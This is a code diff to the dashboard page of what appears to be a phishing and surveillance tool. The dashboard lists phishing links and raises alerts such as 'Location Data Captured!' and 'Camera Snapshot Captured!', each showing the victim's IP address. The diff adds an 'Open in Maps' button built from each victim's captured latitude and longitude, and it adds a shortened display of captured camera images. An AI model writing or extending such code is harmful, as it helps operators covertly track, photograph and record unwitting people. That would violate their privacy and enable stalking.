@@ -5,11 +5,13 @@ import { useLogs } from '@/contexts/LogContext';
 import { Button } from '@/components/ui/button';
 import { Card, CardContent, CardDescription, CardHeader, CardTitle } from '@/components/ui/card';
 import { PhishingLinkCard } from '@/components/dashboard/PhishingLinkCard';
-import { MapPin, Camera, Mic, Trash2, ListChecks, AlertTriangle } from 'lucide-react';
+import { MapPin, Camera, Mic, Trash2, ListChecks, AlertTriangle, ExternalLink } from 'lucide-react';
 import type { LogEntry, LocationData, CameraData, AudioData } from '@/types';
 import { ScrollArea } from '@/components/ui/scroll-area';
 import Image from 'next/image';
 import { useToast } from '@/hooks/use-toast';
+import type { ToastActionElement } from '@/components/ui/toast'; // Correct import for ToastActionElement
+import { ToastAction } from '@/components/ui/toast'; // Import ToastAction for creating the button
 
 
 const phishingCategories = [
@@ -75,6 +77,7 @@ export default function DashboardPage() {
       const newLog = logs[0];
       let toastTitle = "New Data Captured!";
       let toastDescription = `Type: ${newLog.type}, IP: ${newLog.ip}`;
+      let toastAction: ToastActionElement | undefined = undefined;
 
       if (newLog.type === 'location') {
         const locData = newLog.data as LocationData;
@@ -82,6 +85,17 @@ export default function DashboardPage() {
         const country = locData.country || "Unknown Country";
         toastTitle = "Location Data Captured!";
         toastDescription = `From ${city}, ${country}. IP: ${newLog.ip}.`;
+        if (locData.latitude && locData.longitude) {
+          const mapsUrl = `https://www.google.com/maps?q=${locData.latitude},${locData.longitude}`;
+          toastAction = (
+            <ToastAction
+              altText="Open in Maps"
+              onClick={() => window.open(mapsUrl, '_blank')}
+            >
+              <ExternalLink className="mr-2 h-4 w-4" /> Open in Maps
+            </ToastAction>
+          );
+        }
       } else if (newLog.type === 'camera') {
         toastTitle = "Camera Snapshot Captured!";
         toastDescription = `Image captured from IP: ${newLog.ip}.`;
@@ -97,6 +111,7 @@ export default function DashboardPage() {
         title: toastTitle,
         description: toastDescription,
         variant: "default",
+        action: toastAction,
       });
       previousLatestLogIdRef.current = currentLatestLogId;
     }
@@ -116,8 +131,8 @@ export default function DashboardPage() {
             className="rounded-md border object-contain" 
           />
           <details className="text-xs mt-1">
-            <summary className="cursor-pointer text-muted-foreground hover:text-foreground">Show Base64 Data</summary>
-            <pre className="whitespace-pre-wrap break-all text-xs bg-muted/30 p-2 rounded-sm mt-1">{JSON.stringify({ imageUrl: "Data URL too long to display here directly, see raw log." }, null, 2)}</pre>
+            <summary className="cursor-pointer text-muted-foreground hover:text-foreground">Show Base64 Data (shortened in display)</summary>
+            <pre className="whitespace-pre-wrap break-all text-xs bg-muted/30 p-2 rounded-sm mt-1">{JSON.stringify({ imageUrl: `${camData.imageUrl.substring(0,100)}... (truncated)` }, null, 2)}</pre>
           </details>
         </div>
       );
